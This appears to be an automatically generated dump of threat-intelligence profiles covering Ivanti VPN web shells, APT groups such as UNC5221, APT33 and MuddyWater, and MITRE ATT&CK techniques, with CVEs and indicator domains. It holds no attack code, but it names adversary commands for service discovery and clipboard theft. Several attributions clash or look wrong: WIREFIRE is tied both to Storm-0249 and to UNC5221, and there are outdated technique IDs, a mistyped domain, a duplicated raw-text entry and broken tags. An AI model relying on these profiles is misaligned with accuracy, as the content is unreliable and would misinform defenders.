4428.profile_without_enhance_5: [profile]WIREFIRE - S1115, also known as wirefire, is a Python-based web shell that functions as trojanized logic within the visits.py component of Ivanti Connect Secure (formerly Pulse Secure) VPN appliances. It was used by the threat cluster Storm-0249 during the Cutting Edge campaign. Its key behaviors include downloading files to the compromised device and executing arbitrary commands, with associated infrastructure domains like morsag3ah.workers.dev and its subdomains.

4430.name: ROOTROT
4430.profile_without_enhance_5: [profile]ROOTROT is a Perl-based web shell deployed by UNC5221, targeting Ivanti Connect Secure appliances via exploitation of CVE-2023-46805 and CVE-2024-21887. It is embedded into a legitimate file at /data/runtime/tmp/tt/setcookie.thtml.ttc. Its infrastructure includes domains like morsag3ah.workers.dev, log.morsag3ah.workers.de, update.morsag3ah.workers.dev, and cvedev.morsag3ah.workers.dev. Associated MITRE ATT&CK techniques include Deploy Container (T1610), Modify Authentication Process (T1556), Gather Victim Host Information (T1592), Phishing for Information (T1598), and Acquire Infrastructure (T1583).

4431.name: UNC5221
4431.profile_without_enhance_5: [profile]The intrusion set UNC5221, also known as UTA0178 and Red Dev 61, is a suspected China-nexus actor. It is distinguished as the primary group exploiting Ivanti vulnerabilities CVE-2023-46805 and CVE-2024-21887 for initial access, both before and after public disclosure. Its key malware includes the Python-based web shell WIREFIRE and the Perl-based web shell BUSHWALK, which are deployed on compromised Ivanti Connect Secure VPN appliances. Its TTPs involve modifying authentication processes, deploying containers for defense evasion, and gathering victim host information. The group primarily targets technology and legal sectors, with motivations centered on espionage.[/profile]

4438.name: T1556
4438.profile_without_enhance_5: [profile]T1556, "Modify Authentication Process", is a credential access, defense evasion, and persistence technique applicable to Windows, Linux, macOS, and cloud platforms. It involves maliciously altering authentication mechanisms—like Windows LSASS, Unix PAM, or macOS authorization plugins—to capture credentials or bypass authentication entirely, enabling unauthorized access without valid accounts. This can include modifying host software binaries, such as SSH clients, to steal credentials, or disabling conditional access policies in identity providers to maintain persistent account access.

4439.name: Obtain Capabilities
4439.profile_without_enhance_5: [profile]Obtain Capabilities is a Resource Development technique (T1588) within the MITRE ATT&CK framework, applicable to the PRE platform. It involves adversaries acquiring, rather than developing, tools for their operations. This includes purchasing, freely downloading, or stealing malware, software, exploits, and certificates from third-party entities, criminal marketplaces, or other adversaries to support various phases of their lifecycle.

4440.name: T1595
4440.profile_without_enhance_5: [profile]Active Scanning (T1595) is a reconnaissance technique within the MITRE ATT&CK framework, operating on the PRE platform. It involves adversaries directly probing victim infrastructure with network traffic, such as using native protocol features like ICMP, to gather information that can reveal vulnerabilities, support other reconnaissance activities, or enable initial access. This technique is distinct from passive information gathering and is often a precursor to more targeted attacks.

4441.name: Deploy Container
4441.profile_without_enhance_5: [profile]Deploy Container, identified as T1610, is a defense evasion and execution technique targeting container platforms. It involves adversaries deploying containers to run malicious processes or bypass security controls, such as by using privileged or misconfigured containers to escape to the host. Deployment methods include Docker's create and start APIs, Kubernetes dashboards like Kubeflow, and orchestration workloads such as ReplicaSets or DaemonSets, often utilizing malicious or backdoored images. This technique is associated with groups like TeamTNT.

4442.name: Weaken Encryption
4442.profile_without_enhance_5: [profile]Weaken Encryption, identified as T1600, is a Defense Evasion technique targeting Network Devices. It involves compromising a device's encryption capability to bypass data protection, often by manipulating encryption parameters through the Network Device CLI after modifying the system image. Specific sub-techniques include reducing the cipher's key space to weaken encryption strength and disabling dedicated crypto hardware to force reliance on less secure software encryption. This facilitates unauthorized data disclosure and supports credential access or data collection efforts.

4443.name: Modify Authentication Process
4443.profile_without_enhance_5: [profile]Modify Authentication Process is identified as MITRE ATT&CK technique T1556, falling under the Credential Access, Defense Evasion, and Persistence tactics. It targets platforms including Windows, Linux, macOS, and various network and cloud services. This technique involves adversaries maliciously altering core authentication components to bypass security or harvest credentials. Specific implementations include patching the LSASS process on Windows domain controllers to create a universal backdoor (e.g., Skeleton Key malware) and modifying Pluggable Authentication Modules (PAM) like `pam_unix.so` on Unix-based systems to accept adversary-supplied credentials or steal plaintext passwords.

4444.name: Active Scanning
4444.profile_without_enhance_5: [profile]Active Scanning, identified as T1595, is a Reconnaissance tactic within the MITRE ATT&CK framework, applicable to the PRE platform. It involves adversaries directly probing victim infrastructure via network traffic to gather information, such as through ICMP pings or other protocol features, which can reveal details about active hosts, open ports, and software versions to enable further targeting actions like initial access or capability development.

4445.name: T1610
4445.profile_without_enhance_5: [profile]Deploy Container (T1610) is a defense evasion and execution technique targeting container platforms. Adversaries deploy containers to run malicious processes or bypass security controls, such as by using containers without network rules or user limitations. Deployment can occur via Docker's `create` and `start` APIs, web applications like the Kubernetes dashboard, or Kubernetes workloads like ReplicaSets. Containers may be based on malicious images or benign images that download payloads at runtime, and this technique can follow image creation on the host (T1612) or be used for persistence via modified container services (T1543.005).

4446.name: Acquire Infrastructure
4446.profile_without_enhance_5: [profile]Acquire Infrastructure is the MITRE ATT&CK technique T1583 under the Resource Development tactic, applicable to the PRE platform. It involves adversaries buying, leasing, renting, or otherwise obtaining infrastructure such as physical or cloud servers, domains, third-party web services, and botnets to stage, launch, and execute operations. This includes utilizing free trial periods from providers and residential proxy services to blend malicious traffic with normal activity, making it difficult to physically trace back to the adversary while allowing for rapid provisioning and modification of resources.

4447.name: T1600
4447.profile_without_enhance_5: [profile]T1600, Weaken Encryption, is a Defense Evasion technique for Network Devices where adversaries compromise a device's encryption capability to bypass data protection. This can be achieved by manipulating the device through sub-techniques like Reduce Key Space (T1600.001) or Disable Crypto Hardware (T1600.002), which degrade or eliminate secure encryption to facilitate unauthorized data access, credential theft, or collection. The technique is linked to the exploitation of specific vulnerabilities like CVE-2024-22024.[/profile]

4448.name: T1588
4448.profile_without_enhance_5: [profile]T1588 (Obtain Capabilities) is a Resource Development technique in the MITRE ATT&CK framework for the PRE platform. Adversaries acquire capabilities like malware, exploits, software licenses, and vulnerability information to support their operations, rather than developing them internally. This can involve purchasing from criminal marketplaces or third-party companies, freely downloading, or stealing these resources from other entities. The technique is distinct from developing capabilities in-house and can be a precursor to other phases like initial access.

4450.name: LIGHTWIRE
4450.profile_without_enhance_5: [profile]LIGHTWIRE is a Perl-based web shell malware family. It is used to maintain access and enable command execution by being embedded into the legitimate 'compcheckresult.cgi' component of Ivanti Secure Connect VPN appliances. Its key behaviors include exploitation for client execution and exploitation of public-facing applications, specifically leveraging vulnerabilities like CVE-2024-21893 and CVE-2023-46805 for initial access. Associated infrastructure includes domains such as webb-institute.com, gpoaccess.com, and clickcom.click. It was used during the Cutting Edge campaign.[/profile]

4451.name: CHAINLINE
4451.profile_without_enhance_5: [profile]CHAINLINE is a malware entity. Its associated attack patterns include Web Shell, Exploitation for Client Execution, Valid Accounts, Exploit Public-Facing Application, and PowerShell. It is linked to the exploitation of vulnerabilities CVE-2023-46805, CVE-2024-21893, CVE-2024-21888, CVE-2024-21887, and CVE-2024-22024. Associated infrastructure indicators include gpoaccess.com, webb-institute.com, clicko.click, api.d-n-s.name, and miltonhouse.nl. Retrieved information suggests a potential compromise chain and a connection to the threat group 'romcom'.[/profile]

4452.name: BUSHWALK
4452.profile_without_enhance_5: [profile]BUSHWALK is a malware family, also known as a variant of the Kubo Injector. It is a Perl-based web shell embedded into the legitimate Ivanti Connect Secure component `querymanifest.cgi`. Its deployment is associated with the exploitation of vulnerabilities CVE-2024-21893 and CVE-2024-21887, and it utilizes infrastructure domains such as gpoaccess.com, webb-institute.com, and api.d-n-s.name. Its technical behaviors include hooking the `accept` and `accept4` functions within web processes.[/profile]

4454.name: GLASSTOKEN
4454.profile_without_enhance_5: [profile]GLASSTOKEN is a custom web shell malware family. It is used by threat actors to execute commands on compromised Ivanti Connect Secure (formerly Pulse Secure) VPN appliances. Its key technical behavior is exploiting specific vulnerabilities, including CVE-2024-21887 and CVE-2024-21893, for initial access and execution. The malware is based on the Neo-reGeorg tool and has been deployed in campaigns such as Cutting Edge. Associated infrastructure includes domains like gpoaccess.com and webb-institute.com.[/profile]

4482.name: T1505.003
4482.profile_without_enhance_5: [profile]T1505.003, also known as Web Shell, is a persistence technique within the MITRE ATT&CK framework applicable to Windows, Linux, macOS, and Network Devices. It involves placing a malicious web script on an accessible server to establish a persistent gateway into a network, often providing functions or a command-line interface for remote execution. This technique is commonly used by numerous threat groups, including APT28, APT29, and Volt Typhoon, and can be facilitated by exploiting vulnerabilities like CVE-2024-21893. Adversaries may employ related techniques such as custom command and control protocols (T1094) or junk data (T1001.001) to obscure their activities.[/profile]

4483.name: Web Shell
4483.profile_without_enhance_5: [profile]Web Shell is a persistence technique (T1505.003) within the MITRE ATT&CK framework, applicable to Windows, Linux, macOS, and Network Device platforms. It involves placing a malicious server-side script on a web server, providing adversaries with a gateway into the network and a command-line interface for execution. This script can function as redundant access and is often deployed by exploiting vulnerabilities like CVE-2024-21887. Common tools include client interfaces such as China Chopper.

4484.name: TA0008
4484.profile_without_enhance_5: [profile]TA0008, known as Lateral Movement, is a tactic within the MITRE ATTACK framework. It involves techniques adversaries use to enter and control remote systems on a network, often following initial access. This tactic is frequently associated with exploiting specific vulnerabilities, as indicated by connections to CVEs like CVE-2023-46805 and CVE-2024-21888. The primary goal is to expand access from a compromised host to other systems, enabling further actions such as credential dumping from OS caches or accessing sensitive information from databases.

4485.name: TA0006
4485.profile_without_enhance_5: [profile]TA0006, Credential Access, is a high-level tactic within the MITRE ATT&CK framework. It encompasses techniques adversaries use to steal account credentials like passwords, hashes, or tickets. A core related technique is Pass the Hash (T1550.002), where stolen password hashes are used to authenticate and move laterally without needing the cleartext password. This tactic is foundational for attacks exploiting vulnerabilities such as CVE-2024-21888 and CVE-2023-46805 to gain initial access and subsequently harvest credentials.

4501.name: ToddyCat
4501.profile_without_enhance_5: [profile]ToddyCat, also known as Websiic, is a sophisticated APT group active since at least 2020, targeting government and military entities across Europe and Asia. Its key custom malware includes the Samurai passive backdoor and the HackTool:MSIL/Ninja (Ninja) tool for network penetration and remote control. Its TTPs involve establishing persistence via Boot or Logon Initialization Scripts (T1037) and using Proxy techniques (T1090) and Web Services (T1102) for command and control. The group has been observed targeting locations including Afghanistan, Iran, Uzbekistan, Kazakhstan, and Slovakia, with motivations likely aligned with espionage.[/profile]

4616.name: Samurai
4616.profile_without_enhance_5: [profile]Samurai is a passive backdoor malware family used by the APT group ToddyCat since at least 2020. It allows arbitrary C# code execution and is deployed with multiple modules for remote administration and lateral movement. Key technical behaviors include persistence via Boot or Logon Initialization Scripts (T1037), command and control using proxy techniques (T1090) and web protocols (T1071.001), and defense evasion through Process Injection (T1055) and DLL Side-Loading (T1073). It has been associated with infrastructure like the domain eohsdnsaaojrhnqo.windowshost.us and has been deployed against targets in locations including Afghanistan, Iran, Slovakia, Malaysia, and the United Kingdom.[/profile]

4617.name: HackTool:MSIL/Ninja
4617.profile_without_enhance_5: [profile]HackTool:MSIL/Ninja, also known as Ninja, is a C++-developed malware used by the APT group ToddyCat for network penetration and remote system control since at least 2020, targeting government and military entities in Europe and Asia. Its key behaviors include establishing persistence via Boot or Logon Initialization Scripts (T1037), employing Process Injection (T1055) and DLL Side-Loading (T1073) for defense evasion, and using Web Protocols (T1071.001) and Proxy techniques (T1090) for command and control. It has been observed deployed by the Samurai malware and operates on Windows platforms, with associated infrastructure including the domain eohsdnsaaojrhnqo.windowshost.us.[profile]

4631.name: Proxy
4631.profile_without_enhance_5: [profile]The entity "Proxy" is a Command and Control technique, aligning with MITRE ATT&CK T1090. It operates on Windows, Linux, macOS, ESXi, and Network Devices. Adversaries use connection proxies as intermediaries for C2 traffic to avoid direct connections to their infrastructure, employing tools like HTRAN, ZXProxy, and ZXPortMap for traffic redirection. This method helps manage communications, reduce simultaneous outbound connections, provide resiliency, and blend with trusted paths. Proxies can be chained (multi-hop) to further disguise the traffic source, and adversaries may also leverage Content Delivery Networks (CDNs) for proxying.[profile]

4632.name: T1037
4632.profile_without_enhance_5: [profile]T1037, Boot or Logon Initialization Scripts, is a persistence and privilege-escalation technique applicable to Windows, Linux, macOS, ESXi, and Network Devices. It involves adversaries placing scripts that automatically execute during system boot or user logon to establish persistence, potentially with higher privileges. This method can be used to run other programs or perform administrative tasks, and its implementation varies by operating system and configuration, requiring local or administrative credentials for deployment.

4633.name: Boot or Logon Initialization Scripts
4633.profile_without_enhance_5: [profile]Boot or Logon Initialization Scripts, identified as MITRE ATT&CK T1037, is a persistence and privilege-escalation technique applicable to Windows, Linux, macOS, ESXi, and Network Devices. Adversaries abuse scripts that automatically execute during system boot or user logon to maintain access, often achieving higher privileges if the scripts run with elevated rights. Technical execution varies by OS and scope, involving local scripts (e.g., Windows Registry keys like HKCU\Environment\UserInitMprLogonScript) or network-wide scripts deployed via Active Directory Group Policy Objects. This technique has been used by groups like APT29, APT41, and Rocke.

4639.name: APT33
4639.profile_without_enhance_5: [profile]APT33, also known as Elfin, Holmium, Peach Sandstorm, Cobalt Trinity, Magnallium, ATK35, TA451, G0064, and Refined Kitten, is an intrusion set known for its use of custom malware like DROPSHOT/SHAPESHIFT and tools such as DysonPart.exe and MsdUpdate.exe. It employs targeted spear-phishing campaigns using spoofed domains and email addresses, and maintains multiple, obfuscated C2 servers for narrow targeting. The group is believed to be state-sponsored, with suspected links to Iran, and primarily targets the oil, aviation, and petrochemical sectors, with victims concentrated in the Middle East, the U.S., and Asia, indicating a motivation for strategic intelligence gathering and potential disruption.

4640.name: Botnet
4640.profile_without_enhance_5: [profile]Botnet is a malware family attributed to APT33, which aggressively targets the oil and aviation industries. It uses multiple layers of obfuscation and about a dozen live Command and Control (C&C) servers for extremely narrow targeting, with campaigns against organizations in the Middle East, the U.S., and Asia. Associated infrastructure includes domains like qualitweb.com and oorgans.com, and files such as MsdUpdate.exe, with indicators like email addresses careers@aramcojobs.ga.[/profile]

4770.name: The threat group regularly referred to as APT33 is known to target the oil and aviation industries aggressively. This threat group has been reported on consistently for years, but our recent findings show that the group has been using about a dozen live Command and Control (C&C) servers for extremely narrow targeting. The group puts up multiple layers of obfuscation to run these C&C servers in extremely targeted malware campaigns against organizations in the Middle East, the U.S., and Asia.

4771.name: The threat group regularly referred to as APT33 is known to target the oil and aviation industries aggressively. This threat group has been reported on consistently for years, but our recent findings show that the group has been using about a dozen live Command and Control (C&C) servers for extremely narrow targeting. The group puts up multiple layers of obfuscation to run these C&C servers in extremely targeted malware campaigns against organizations in the Middle East, the U.S., and Asia.

4830.name: NETWIRE
4830.profile_without_enhance_5: [profile]NETWIRE is a Remote Access Trojan (RAT) malware family, also known as netwire rc. It has been associated with threat groups including APT33 and Solar Spider. Its key technical behaviors include persistence via Boot or Logon Autostart Execution, user execution for initial access, and data collection through Audio Capture, Video Capture, and Data from Cloud Storage. It targets Windows, Linux, and macOS platforms. Associated infrastructure includes domains like diskonline.net, yandeksdisk.org, ghcc.duckdns.org, and zaminkaran.ir, with historical connections to locations such as Belarus and the Russian Federation.[/profile]

4831.name: Sticky Werewolf
4831.profile_without_enhance_5: [profile]Sticky Werewolf, also known as Angry Likho, is an intrusion set suspected to have geopolitical and/or hacktivist ties, with unclear geographical origin. Its key malware is the NETWIRE Remote Access Trojan (RAT), and its technical behaviors include persistence via Boot or Logon Autostart Execution (T1547) and data collection through Video Capture (T1125), Audio Capture (T1123), and Clipboard Data (T1115). The group has been linked to infrastructure domains such as yandeksdisk.org and diskonline.net. Recent campaigns have targeted the aviation sector, suggesting espionage and data exfiltration motivations. The group shows overlaps with other clusters like TA2101 (Twisted Spider) and Viking Spider.[/profile]

4841.name: T1046
4841.profile_without_enhance_5: [profile]The entity is MITRE ATT&CK technique T1046, Network Service Discovery, within the Discovery tactic. It operates on platforms including Windows, Linux, macOS, Network Devices, Containers, and IaaS. Adversaries use this technique to enumerate services on remote hosts and local network devices to identify potential targets for exploitation, employing tools like port scanners or native utilities such as the macOS Bonjour mDNSResponder daemon with commands like `dns-sd -B _ssh._tcp .`. It is commonly used as a precursor to techniques like Exploitation of Remote Services (T1210) for lateral movement. Associated threat groups include FIN6, APT41, and Volt Typhoon.

4842.name: T1125
4842.profile_without_enhance_5: [profile]T1125, Video Capture, is a collection technique within the MITRE ATTACK framework applicable to Windows, Linux, and macOS. It involves adversaries using malware or scripts to interact with a system's peripheral devices, like integrated cameras or webcams, or applications such as video call services through available APIs to capture video recordings or images for information gathering. This technique is distinct from screen capture as it specifically targets video input devices. Malware families like FruitFly and Proton have employed this method on macOS.

4843.name: T1414
4843.profile_without_enhance_5: [profile]T1414, also known as Clipboard Data, is a mobile attack technique within the MITRE ATT&CK framework, categorized under the Collection and Credential Access tactics and applicable to Android and iOS platforms. This technique involves adversaries monitoring or intercepting the device's clipboard to collect sensitive data, such as copied passwords, cryptocurrency wallet addresses, or other information users temporarily store there, often through malicious applications with the necessary permissions.

4844.name: Network Service Discovery
4844.profile_without_enhance_5: [profile]Network Service Discovery, identified as T1046, is a Discovery tactic used on platforms including Windows, Linux, macOS, Network Devices, Containers, and IaaS. The technique involves adversaries enumerating services on remote hosts and network devices to identify potential targets for exploitation, commonly using port, vulnerability, or wordlist scans. Specific methods include using the native macOS Bonjour service with mDNS queries like `dns-sd -B _ssh._tcp .` to find SSH services. The discovered information often directly enables follow-on actions like Exploitation of Remote Services (T1210).

4845.name: Video Capture
4845.profile_without_enhance_5: [profile]Video Capture is a MITRE ATT&CK technique with ID T1125 under the Collection tactic, applicable to Windows, Linux, and macOS platforms. It involves using malware or scripts to interact with peripheral devices like integrated cameras or applications such as video call services via operating system or application APIs to record video or capture images, which are then written to disk for later exfiltration. This technique is distinct from screen capture and has been used by groups like Silence, FIN7, and Ember Bear, with malware examples including FruitFly and Proton on macOS.

4846.name: Clipboard Data
4846.profile_without_enhance_5: [profile]Clipboard Data is a MITRE ATT&CK technique with ID T1115, categorized under the Collection tactic and applicable to Windows, macOS, and Linux platforms. It involves adversaries collecting data from a user's clipboard, using OS-specific commands like `clip.exe` or `Get-Clipboard` on Windows and `pbpaste` on macOS and Linux. This technique can also be used to monitor and replace clipboard contents for data manipulation, and it has been associated with threat groups like APT38, APT39, and OilRig.

4848.name: MuddyWater
4848.profile_without_enhance_5: [profile]MuddyWater, also known as Earth Vetala, TEMP.Zagros, Mercury, Boggy Serpens, Static Kitten, Seedworm, TA450, Cobalt Ulster, and Mango Sandstorm, is an Iranian cyber espionage group assessed to be a subordinate element within Iran's Ministry of Intelligence and Security (MOIS). Its key malware includes MERCURY, and it employs TTPs such as spearphishing links (T1566.002), remote services for lateral movement (T1021), and boot/logon autostart execution for persistence (T1547). The group has targeted government and private sectors, including telecommunications, defense, and oil and gas, across the Middle East, Asia, Africa, Europe, and North America, primarily for espionage purposes.[/profile]
